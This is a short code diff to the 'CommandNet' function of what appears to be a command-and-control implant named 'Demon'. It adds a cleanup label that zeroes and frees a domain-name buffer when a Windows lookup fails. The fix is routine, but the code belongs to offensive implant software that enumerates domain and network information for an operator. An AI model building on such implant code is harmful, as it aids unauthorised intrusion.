@@ -2052,9 +2052,8 @@ VOID CommandNet( PPARSER Parser )
                 {
                     if ( ! Instance.Win32.GetComputerNameExA( ComputerNameDnsDomain, Domain, &Length ) )
                     {
-                        PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
-                        PackageDestroy( Package );
-                        return;
+                       PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
+                       goto DOMAIN_CLEANUP;
                     }
                 }
             }
@@ -2068,6 +2067,14 @@ VOID CommandNet( PPARSER Parser )
             }
 
             break;
+        DOMAIN_CLEANUP:
+            if ( Domain )
+            {
+                MemSet( Domain, 0, Length );
+                Instance.Win32.LocalFree( Domain );
+            }
+            PackageDestroy( Package );
+            return;
         }
 
         case DEMON_NET_COMMAND_LOGONS:
